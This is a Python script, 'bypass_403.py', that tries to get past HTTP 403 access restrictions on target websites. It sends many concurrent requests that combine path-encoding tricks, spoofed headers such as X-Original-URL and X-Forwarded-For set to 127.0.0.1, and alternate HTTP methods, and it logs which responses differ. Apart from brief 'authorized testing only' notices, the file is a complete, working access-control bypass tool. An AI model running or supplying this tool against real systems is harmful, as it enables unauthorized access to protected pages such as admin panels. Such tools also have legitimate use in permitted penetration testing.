#!/usr/bin/env python3
"""
bypass_403.py

Usage examples:
  python3 bypass_403.py -l targets.txt -c 30 --timeout 8 --out results.csv
  python3 bypass_403.py -u https://example.com/admin -m GET -H extra_headers.txt

Only use this script on systems you have explicit permission to test.
"""

import argparse
import concurrent.futures
import csv
import sys
import time
from urllib.parse import urljoin, urlparse

import requests

# ------- Configuration: payloads and header-variations -------
# Path variants (based on examples user provided + common tweaks)
PATH_VARIANTS = [
    "/", "/%2e/", "//.", "////", "/.//./", "/%20", "/%09", "/?", "/.html",
    "//?anything", "/#", "/%2e%2e%2f", "/;", "/;/", "/%2e", "/..;/", "/%2e%2e%3b%2f",
    "/.php", "/.json", "/.html", "/index.html", "//*/", "/%2e%2e/%2e%2e/", "/%2e%2e%2f",
]

# Header variations (common header tricks)
HEADER_VARIANTS = [
    {},  # no extra header
    {"X-Original-URL": "/"},
    {"X-Custom-IP-Authorization": "127.0.0.1"},
    {"X-Forwarded-For": "127.0.0.1"},
    {"X-Forwarded-For": "127.0.0.1:80"},
    {"X-Rewrite-URL": "/"},
    {"X-Host": "127.0.0.1"},
    {"X-Forwarded-Host": "127.0.0.1"},
    {"X-Forwarded-For": "http://127.0.0.1"},
    {"X-Original-URL": "/%2e/"},
    {"X-Forwarded-Proto": "https"},
]

# Method variants (common alternatives)
METHODS = ["GET", "HEAD", "POST", "TRACE", "OPTIONS"]

# Some body/content-length tricks for POST
POST_BODIES = [None, "", "a=1", " "]

# ------- Helpers -------

def load_lines(path):
    with open(path, "r", encoding="utf-8") as f:
        return [line.strip() for line in f if line.strip() and not line.strip().startswith("#")]

def normalize_target(u):
    # ensure scheme present
    if not u.startswith("http://") and not u.startswith("https://"):
        u = "https://" + u
    return u.rstrip()

def build_variations(base_url, extra_paths=None):
    """Yield (full_url, description) tuples for requests to try."""
    parsed = urlparse(base_url)
    base_root = f"{parsed.scheme}://{parsed.netloc}"
    path_prefix = parsed.path.rstrip("/") or ""
    # We want to try:
    #  - base path with variants appended
    #  - base root + variants
    variants = extra_paths or PATH_VARIANTS
    for v in variants:
        # try joining with original path if present
        if path_prefix and path_prefix != "/":
            yield (urljoin(base_url, v), f"join_with_path {v}")
        # try from root
        yield (urljoin(base_root + "/", v.lstrip("/")), f"root_variant {v}")

def merge_headers(base_headers, extra):
    h = dict(base_headers or {})
    h.update(extra or {})
    return h

# ------- Worker -------

def attempt_request(session, url, method="GET", headers=None, body=None, timeout=10, allow_redirects=False):
    try:
        # Some servers react differently to allow_redirects True/False
        r = session.request(method=method, url=url, headers=headers, data=body, timeout=timeout, allow_redirects=allow_redirects, verify=False)
        return (r.status_code, len(r.content or b''), r.elapsed.total_seconds())
    except requests.exceptions.RequestException as e:
        return ("ERR", str(e), 0.0)

# ------- Main runner -------

def run_target(target, args, base_headers):
    results = []
    session = requests.Session()
    session.headers.update({"User-Agent": args.user_agent})
    if args.proxy:
        session.proxies.update({"http": args.proxy, "https": args.proxy})

    variations = list(build_variations(target))
    # Optionally extend with explicit variants from CLI
    if args.extra:
        for e in args.extra:
            variations.append((urljoin(target, e), f"extra {e}"))

    # iterate combinations (method x path x header x body)
    combos = []
    for url, descr in variations:
        for method in ( [args.method] if args.method else METHODS ):
            for hdr in HEADER_VARIANTS:
                for post_body in (POST_BODIES if method in ("POST", "TRACE", "OPTIONS") else [None]):
                    combos.append((url, method, merge_headers(base_headers, hdr), post_body, descr))

    # Optionally limit number of combos per target
    if args.max_per_target and len(combos) > args.max_per_target:
        combos = combos[: args.max_per_target]

    # run with ThreadPool
    def worker(task):
        url, method, hdrs, body, descr = task
        if args.dry_run:
            return {"url": url, "method": method, "headers": hdrs, "body_len": len(body or ""), "status": "DRY", "size": 0, "time": 0.0, "descr": descr}
        status, size, elapsed = attempt_request(session, url, method=method, headers=hdrs, body=body, timeout=args.timeout, allow_redirects=False)
        return {"url": url, "method": method, "headers": hdrs, "body_len": len(body or ""), "status": status, "size": size, "time": elapsed, "descr": descr}

    outputs = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=args.concurrency) as ex:
        futures = {ex.submit(worker, c): c for c in combos}
        for fut in concurrent.futures.as_completed(futures):
            out = fut.result()
            outputs.append(out)
            # optional small delay to be polite
            if args.delay:
                time.sleep(args.delay)

    return outputs

# ------- CLI and orchestration -------

def parse_args():
    p = argparse.ArgumentParser(description="Authorized testing helper: try many HTTP variations to detect differences in 403 responses.")
    p.add_argument("-l", "--list", help="File with targets (one per line).")
    p.add_argument("-u", "--url", help="Single target URL.")
    p.add_argument("-o", "--out", default="bypass_results.csv", help="CSV output file.")
    p.add_argument("-c", "--concurrency", type=int, default=10, help="Concurrent threads per target.")
    p.add_argument("--timeout", type=float, default=10.0, help="Request timeout seconds.")
    p.add_argument("--delay", type=float, default=0.0, help="Delay between requests (seconds).")
    p.add_argument("-m", "--method", choices=METHODS, help="Limit to a single HTTP method.")
    p.add_argument("-H", "--headers-file", help="File with additional headers (KEY: VALUE per line).")
    p.add_argument("--extra", nargs="*", help="Extra path variants to try (e.g. '/.php', '/%2e/').")
    p.add_argument("--user-agent", default="Mozilla/5.0 (compatible; bypass-403-script/1.0)", help="User-Agent string.")
    p.add_argument("--proxy", help="HTTP(S) proxy (e.g. http://127.0.0.1:8080).")
    p.add_argument("--dry-run", action="store_true", help="Don't send requests, only show planned combos.")
    p.add_argument("--max-per-target", type=int, help="Cap total attempts per target (for safety).")
    return p.parse_args()

def load_headers_file(path):
    hdr = {}
    if not path:
        return hdr
    for line in load_lines(path):
        if ":" in line:
            k, v = line.split(":", 1)
            hdr[k.strip()] = v.strip()
    return hdr

def main():
    args = parse_args()

    if not args.list and not args.url:
        print("Error: supply -l list.txt or -u https://target/ .")
        sys.exit(1)

    targets = []
    if args.list:
        targets = [normalize_target(t) for t in load_lines(args.list)]
    if args.url:
        targets.append(normalize_target(args.url))

    base_headers = load_headers_file(args.headers_file)

    all_results = []
    for t in targets:
        print(f"[+] Running target: {t}")
        res = run_target(t, args, base_headers)
        all_results.extend([{"target": t, **r} for r in res])

    # write CSV
    keys = ["target", "url", "method", "status", "size", "time", "body_len", "descr"]
    with open(args.out, "w", newline="", encoding="utf-8") as csvf:
        writer = csv.DictWriter(csvf, fieldnames=keys, extrasaction="ignore")
        writer.writeheader()
        for r in all_results:
            writer.writerow({
                "target": r.get("target"),
                "url": r.get("url"),
                "method": r.get("method"),
                "status": r.get("status"),
                "size": r.get("size"),
                "time": r.get("time"),
                "body_len": r.get("body_len"),
                "descr": r.get("descr"),
            })

    print(f"[+] Done. Results saved to {args.out}")
    print("[!] Remember: only test targets you are authorized to test.")

if __name__ == "__main__":
    # Suppress insecure warnings for verify=False usage; acceptable for testing but be cautious.
    requests.packages.urllib3.disable_warnings()
    main()
